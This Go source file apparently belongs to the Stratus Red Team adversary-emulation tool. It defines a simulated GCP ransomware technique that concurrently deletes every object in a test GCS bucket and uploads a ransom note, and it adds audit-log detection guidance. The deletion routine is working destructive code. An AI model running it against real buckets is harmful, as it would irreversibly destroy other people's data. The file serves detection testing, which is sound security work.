package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"sync"

	"cloud.google.com/go/storage"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"google.golang.org/api/iterator"
)

//go:embed main.tf
var tf []byte

const ransomNote = `Your data has been encrypted and exfiltrated.
To recover your files, contact: attacker@stratus-red-team.cloud
Your unique ID: STRATUS-RED-TEAM-SIMULATION
This is a security simulation by Stratus Red Team.`

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.impact.ransomware-gcs-batch-deletion",
		FriendlyName: "Ransomware Simulation — Delete All GCS Objects in Batch",
		Description: `
Simulates a GCS ransomware attack by deleting all objects in a bucket
concurrently (in parallel goroutines) and uploading a ransom note. This
mirrors the pattern used by ransomware that bulk-deletes cloud storage
to maximize impact and generate storage deletion billing events for the victim.

Warm-up:

- Create a GCS bucket with 50 test objects

Detonation:

- List all objects in the bucket
- Delete all objects concurrently using goroutines
- Upload a ransom note as <code>RANSOM_NOTE.txt</code>

References:

- https://cloud.google.com/storage/docs/deleting-objects
- https://cloud.google.com/storage/docs/json_api/v1/objects/delete
- https://panther.com/blog/detecting-and-hunting-for-cloud-ransomware-part-2-gcp-gcs
- https://www.paloaltonetworks.com/blog/prisma-cloud/ransomware-data-protection-cloud/
`,
		Detection: `
Identify a burst of GCS object deletions by monitoring for a high volume of
<code>storage.objects.delete</code> events in GCP Data Access audit logs in
a short time window, particularly when followed by the creation of a file
named <code>RANSOM_NOTE.txt</code>.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	ctx := context.Background()

	storageClient, err := storage.NewClient(ctx, providers.GCP().Options())
	if err != nil {
		return fmt.Errorf("failed to create Storage client: %w", err)
	}
	defer storageClient.Close()

	bucket := storageClient.Bucket(bucketName)

	// Collect all object names to delete.
	var objectNames []string
	it := bucket.Objects(ctx, nil)
	for {
		attrs, err := it.Next()
		if err == iterator.Done {
			break
		}
		if err != nil {
			return fmt.Errorf("failed to list objects in bucket %s: %w", bucketName, err)
		}
		objectNames = append(objectNames, attrs.Name)
	}

	log.Printf("Deleting %d objects from bucket %s concurrently\n", len(objectNames), bucketName)

	var wg sync.WaitGroup
	errCh := make(chan error, len(objectNames))

	for _, name := range objectNames {
		wg.Add(1)
		go func(objectName string) {
			defer wg.Done()
			if err := bucket.Object(objectName).Delete(ctx); err != nil {
				errCh <- fmt.Errorf("failed to delete object %s: %w", objectName, err)
			}
		}(name)
	}

	wg.Wait()
	close(errCh)

	// Collect any deletion errors but continue to upload the ransom note.
	var deleteErrors []error
	for err := range errCh {
		deleteErrors = append(deleteErrors, err)
	}

	if len(deleteErrors) > 0 {
		return fmt.Errorf("encountered %d errors deleting objects: first error: %w", len(deleteErrors), deleteErrors[0])
	}

	log.Printf("Successfully deleted %d objects. Uploading ransom note.\n", len(objectNames))
	writer := bucket.Object("RANSOM_NOTE.txt").NewWriter(ctx)
	if _, err := fmt.Fprint(writer, ransomNote); err != nil {
		writer.Close()
		return fmt.Errorf("failed to write ransom note: %w", err)
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("failed to finalize ransom note upload: %w", err)
	}

	log.Printf("Ransomware simulation complete. Ransom note uploaded to gs://%s/RANSOM_NOTE.txt\n", bucketName)
	return nil
}
